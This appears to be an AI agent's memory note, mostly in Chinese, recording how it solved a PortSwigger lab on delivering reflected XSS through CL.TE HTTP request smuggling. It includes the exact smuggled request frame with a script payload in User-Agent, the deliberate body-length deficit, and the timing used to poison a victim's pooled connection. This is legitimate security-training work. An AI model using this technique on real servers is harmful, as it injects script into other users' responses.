---
metadata:
  node_type: memory
name: "prs_c2coe armA lab-deliver-reflected-xss"
description: "Arm A: lab-deliver-reflected-xss solved via CL.TE (front-end ignores chunked) smuggling GET /post?postId=1 with XSS in User-Agent, 2-byte body deficit; one clean arm + ~110s silent window for the victim; poison survives >=30s."
last_updated: 2026-10-09T16:07:14+08:00
created: 2026-10-09T16:07:14+08:00
---

Arm A 实录 (<=40 行)

目标: PortSwigger "Exploiting request smuggling to deliver reflected XSS"。
起实例: range_launch launch-url /web-security/request-smuggling/exploiting/lab-deliver-reflected-xss (jar /tmp/cj1.json, reused:false)。

侦察: GET /post?postId=1 把 User-Agent 反射进 <input required type="hidden" name="userAgent" value="UA">。
方向: 题面"front-end doesn't support chunked" => CL.TE (前端按 CL, 后端按 TE chunked)。实测单发 CL+TE 帧只回一条响应, 后端停在半请求。

帧 (conn_reuse --cl-te '<prefix>'):
  GET /post?postId=1 HTTP/1.1
  Host: <instance>
  User-Agent: a"><script>alert(1)</script>
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 5

  x=1
关键: 故意留 2 字节 body 缺口 (CL 5 / body "x=1" 3 字节)。前端忽略 TE, 按外层 CL 原样转发; 后端按 chunked 在 "0\r\n\r\n" 结束 POST 并回 200, 随后把走私 GET 卡在等 body; 该池化连接上的下一个请求补完 body 并收到被投毒的 /post 页。

证据: 新连接探针 (conn_reuse --send-str 'GET / ...') 回 Content-Length 8127, body 含
  value="a"><script>alert(1)</script>">  => 跨连接投递成立。
毒存活: 臂后静默 30s 再探针仍回 8127 => 毒 >=30s 不死。

触发: 一次干净 arm (arm 响应 8530 = 首页 = 池化连接干净), 然后完全静默 ~110s 不给任何 HTTP, 让模拟受害者的周期访问成为第一个消费者。
坑: 早先每轮 arm 后 12-35s 就 banner_verdict, 检查自身把毒吃掉, 一直 solved:false。重复 arm/探针还会留下 off-by-one 垃圾响应。

终态: banner_verdict solved:true, congrats_line "Congratulations, you solved the lab!"。

